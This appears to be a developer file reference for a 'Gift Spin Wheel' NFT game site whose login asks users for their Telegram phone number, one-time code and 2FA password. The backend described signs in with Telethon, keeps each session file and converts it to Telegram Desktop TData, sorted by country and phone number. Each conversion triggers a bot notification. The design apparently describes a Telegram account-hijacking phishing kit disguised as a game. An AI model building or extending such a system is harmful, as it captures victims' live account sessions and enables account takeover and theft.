# Project File Reference

Quick lookup for key files in the Gift Spin Wheel project.

---

## 🎯 Critical Files

### Frontend - Authentication

**`src/components/LoginModal.tsx`** (392 lines)
- Main authentication component
- Handles: country code selection, phone input, OTP verification, 2FA
- Features: 36 countries, dynamic placeholders, digit box navigation, error handling
- Key exports: `COUNTRY_CODES`, `LoginModal`

### Frontend - Module Integration

**`src/pages/modules/Shop/ShopModule.tsx`**
- NFT shop with authentication
- Features: top-up dialog, inventory access after login
- Key functions: `handleLogin`, `handleTopUpClick`, `handleTopUp`

**`src/pages/modules/CoinFlip/CoinFlipModule.tsx`**
- Coin flip game with authentication
- Same structure and features as Shop
- Integrated with login modal

**`src/pages/modules/Roulette/RouletteModule.tsx`**
- Main roulette game
- Updated with rarity translation support

### Frontend - UI Components

**`src/components/Inventory.tsx`**
- Displays user's NFT inventory
- Shows rarity in current language using `rarityLabels` mapping

**`src/components/Header.tsx`**
- Navigation header
- Shows login/logout buttons based on authentication state

### Internationalization

**`src/i18n/translations.ts`** (Complete translation file)
- 12 languages: Russian, English, Spanish, Italian, Chinese, Hebrew, Arabic, French, German, Portuguese, Japanese, Hindi
- Contains all UI strings and error messages
- **Recent additions:** `"rarity:"` label for all languages

**`src/contexts/LanguageContext.tsx`**
- Language state management
- Provides `useLanguage()` hook for components

### Backend - Authentication

**`backend/auth.py`** (256 lines)
- Core authentication logic
- Functions: `send_code()`, `verify_code()`, `verify_password()`
- Features: input validation, country code mapping, session management, error handling
- Database: Session files organized by country code

**`backend/convert_sessions.py`** (167 lines)
- Converts Telegram sessions to TData format
- Supports opentele library with fallback mechanisms
- Sends Telegram notifications on conversion events
- Updated to support country-specific output directories

**`backend/server.js`**
- Express server
- Routes: `/api/auth/send-code`, `/api/auth/verify-code`, `/api/auth/verify-password`
- Listens on port 3001

### Backend - Configuration

**`backend/.env`** (You create this)
- Telegram API credentials: `TELEGRAM_API_ID`, `TELEGRAM_API_HASH`
- Optional bot notifications: `NOTIFY_BOT_TOKEN`, `NOTIFY_BOT_CHAT_ID`

**`backend/requirements.txt`**
- Python dependencies: telethon, python-dotenv, opentele

---

## 📁 Directory Structure

### Session/TData Storage

```
backend/
├── sessions/
│   ├── ru/          # Russian phone numbers
│   ├── us/          # USA phone numbers
│   ├── de/          # Germany phone numbers
│   └── ... (36 countries total)
│
└── tdatas/
    ├── ru/
    │   ├── 9123456789/
    │   │   └── tdata/
    │   │       ├── key_data
    │   │       ├── key_file
    │   │       ├── auth_key
    │   │       └── ...
    │   └── 9234567890/
    │       └── tdata/
    └── ... (organized by country code)
```

**Files created during auth:**
- Session: `backend/sessions/{cc}/{phone}.session`
- TData: `backend/tdatas/{cc}/{phone}/tdata/`

### Component Structure

```
src/
├── components/
│   ├── LoginModal.tsx         ✅ Authentication UI
│   ├── Inventory.tsx          ✅ NFT inventory with translations
│   ├── Header.tsx
│   ├── Roulette.tsx
│   └── ... (other components)
│
├── pages/
│   ├── modules/
│   │   ├── Shop/
│   │   │   └── ShopModule.tsx ✅ Shop with auth
│   │   ├── CoinFlip/
│   │   │   └── CoinFlipModule.tsx ✅ CoinFlip with auth
│   │   └── Roulette/
│   │       └── RouletteModule.tsx ✅ Updated with translations
│   └── Index.tsx
│
└── i18n/
    └── translations.ts        ✅ All 12 language translations
```

---

## 🔑 Key Functions

### Backend - auth.py

| Function | Purpose | Parameters | Returns |
|----------|---------|-----------|---------|
| `get_country_code()` | Extract country code from phone | `phone: str` | `str` (e.g., "ru") |
| `get_session_dir_for_country()` | Get session directory path | `country_code: str` | `Path` |
| `get_tdata_dir_for_country()` | Get TData directory path | `country_code: str` | `Path` |
| `send_code()` | Send verification code | `phone: str` | `dict` with success/error |
| `verify_code()` | Verify OTP code | `phone, code, phone_code_hash` | `dict` with user data or error |
| `verify_password()` | Verify 2FA password | `phone, password, phone_code_hash, code` | `dict` with user data or error |

### Frontend - LoginModal.tsx

| Function | Purpose | Triggers |
|----------|---------|----------|
| `handleSendCode()` | Send code to phone | "Отправить код" button |
| `handleVerifyCode()` | Verify OTP | "Проверить" button (code step) |
| `handleVerifyPassword()` | Verify 2FA password | "Проверить" button (password step) |
| `getCurrentCountry()` | Get placeholder for selected country | On country change |

---

## 🌐 API Endpoints

### POST `/api/auth/send-code`
**Input:** `{ phone: "+79123456789" }`  
**Output:** `{ success: true, phone_code_hash: "...", message: "Code sent" }`  
**Errors:** `invalid_phone`, `already_authorized`, `send_code_failed`

### POST `/api/auth/verify-code`
**Input:** `{ phone: "+79123456789", code: "12345", phone_code_hash: "..." }`  
**Output:** `{ success: true, user_id: 123, username: "john", first_name: "John", tdata: "/path" }`  
**Errors:** `invalid_code`, `password_needed`, `verify_code_failed`

### POST `/api/auth/verify-password`
**Input:** `{ phone: "+79123456789", password: "pwd", phone_code_hash: "...", code: "12345" }`  
**Output:** Same as verify-code  
**Errors:** `invalid_password`, `verify_password_failed`

---

## 🎨 UI Components Used

From `shadcn/ui` library:

| Component | Used In | Purpose |
|-----------|---------|---------|
| `Dialog` | LoginModal | Authentication modal |
| `Button` | All modules | Actions (Send, Verify, Top-up) |
| `Input` | LoginModal | Phone/password input |
| `Select` | LoginModal | Country code selection |
| `DialogHeader/Title/Description` | LoginModal | Modal structure |
| `Sheet` | MobileMenu | Mobile navigation |

---

## 🌍 Language Support Matrix

| Language | Code | File Location | Usage |
|----------|------|---------------|-------|
| Russian | ru | translations.ts | Default language |
| English | en | translations.ts | Secondary language |
| Spanish | es | translations.ts | User selection |
| Italian | it | translations.ts | User selection |
| Chinese | zh | translations.ts | User selection |
| Hebrew | he | translations.ts | User selection |
| Arabic | ar | translations.ts | User selection |
| French | fr | translations.ts | User selection |
| German | de | translations.ts | User selection |
| Portuguese | pt | translations.ts | User selection |
| Japanese | ja | translations.ts | User selection |
| Hindi | hi | translations.ts | User selection |

**Translation Keys Used:**
- `authRequired`, `authSuccess`, `authError`
- `enterPhone`, `enterCode`, `enterPassword`
- `sendCodeButton`, `verifyButton`, `backButton`
- `rarity:`, `common`, `rare`, `epic`, `legendary`
- `invalidCode`, `invalidPassword`, `serverError`

---

## 🔗 Import Dependencies

### Frontend Key Imports

```typescript
// Components
import { Dialog, DialogContent, ... } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, ... } from "@/components/ui/select";

// Context
import { useLanguage } from "@/contexts/LanguageContext";

// UI Notifications
import { toast } from "sonner";

// Icons
import { LogIn } from "lucide-react";
```

### Backend Key Imports

```python
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError
)
from convert_sessions import convert_session_to_tdata
import asyncio
from pathlib import Path
```

---

## 📊 State Management

### LoginModal Internal State

```typescript
const [step, setStep] = useState<AuthStep>("phone");
const [countryCode, setCountryCode] = useState("+7");
const [phone, setPhone] = useState("");
const [code, setCode] = useState("");
const [password, setPassword] = useState("");
const [loading, setLoading] = useState(false);
const [phoneCodeHash, setPhoneCodeHash] = useState("");
const [userData, setUserData] = useState<any>(null);
```

### Module State (Shop/CoinFlip)

```typescript
const [isAuthenticated, setIsAuthenticated] = useState(false);
const [username, setUsername] = useState("");
const [showLogin, setShowLogin] = useState(false);
const [showTopUpDialog, setShowTopUpDialog] = useState(false);
```

### Context State (Language)

```typescript
const [currentLanguage, setCurrentLanguage] = useState("ru");
const [translations, setTranslations] = useState(allTranslations["ru"]);
```

---

## 🚀 Recent Changes Summary

| File | Change | Impact |
|------|--------|--------|
| `LoginModal.tsx` | Complete rewrite with country selector, OTP boxes | UI/UX improvement |
| `auth.py` | Added error handling, session management | Backend robustness |
| `convert_sessions.py` | Added output_dir parameter | Country-based organization |
| `ShopModule.tsx` | Added auth integration | Feature parity |
| `CoinFlipModule.tsx` | Added auth integration | Feature parity |
| `Inventory.tsx` | Added rarity translations | Multilingual support |
| `RouletteModule.tsx` | Added rarity translations | Multilingual support |
| `translations.ts` | Added "rarity:" for all languages | Completeness |

---

## 📝 Important Notes

### Session Cleanup Policy
- Sessions created on `send_code()`
- Kept on successful `verify_code()` 
- **Deleted on `PhoneCodeInvalidError`**
- **Deleted on invalid password**
- TData only created on complete success

### Country Code Mapping
Located in `backend/auth.py`:
```python
COUNTRY_CODE_MAP = {
    '+1': 'us',
    '+7': 'ru',
    '+44': 'uk',
    # ... 33 more countries
}
```

### Error Response Format
All endpoints return:
```json
{
  "success": true/false,
  "error": "error_code",  // Only if success = false
  "message": "User-friendly message",
  "user_id": 123,         // Only on success
  "tdata": "/path/to/tdata" // Only on success
}
```

---

## 🔗 File Dependencies

```
LoginModal.tsx
    ├── LanguageContext.tsx (useLanguage)
    ├── ui/dialog.tsx (shadcn)
    ├── ui/button.tsx (shadcn)
    ├── ui/input.tsx (shadcn)
    ├── ui/select.tsx (shadcn)
    └── sonner (toast)

ShopModule.tsx / CoinFlipModule.tsx
    ├── LoginModal.tsx
    ├── Inventory.tsx
    ├── Header.tsx
    ├── LanguageContext.tsx
    └── ui/* (shadcn components)

Inventory.tsx
    ├── LanguageContext.tsx
    ├── useGiftImage.ts
    ├── ui/button.tsx
    └── ui/dialog.tsx

auth.py
    ├── telethon
    ├── convert_sessions.py
    └── .env (config)

convert_sessions.py
    ├── opentele
    └── telethon
```

---

## 🎓 Learning Resources

- **Telethon Docs:** https://docs.telethon.dev/
- **Telegram API:** https://core.telegram.org/api
- **React Hooks:** https://react.dev/reference/react/hooks
- **shadcn/ui:** https://ui.shadcn.com/
- **TailwindCSS:** https://tailwindcss.com/

---

## 📞 Quick Help

**Where to find...**

- 🔐 Authentication logic → `backend/auth.py`
- 🎨 Login UI → `src/components/LoginModal.tsx`
- 🌐 Translations → `src/i18n/translations.ts`
- 🛒 Shop module → `src/pages/modules/Shop/ShopModule.tsx`
- 🎮 Roulette game → `src/pages/modules/Roulette/RouletteModule.tsx`
- 🏪 Inventory → `src/components/Inventory.tsx`
- 📦 Sessions → `backend/sessions/{country_code}/`
- 💾 TData → `backend/tdatas/{country_code}/`

---

**Version:** 1.0  
**Last Updated:** Current Session  
**Status:** Complete Reference ✅
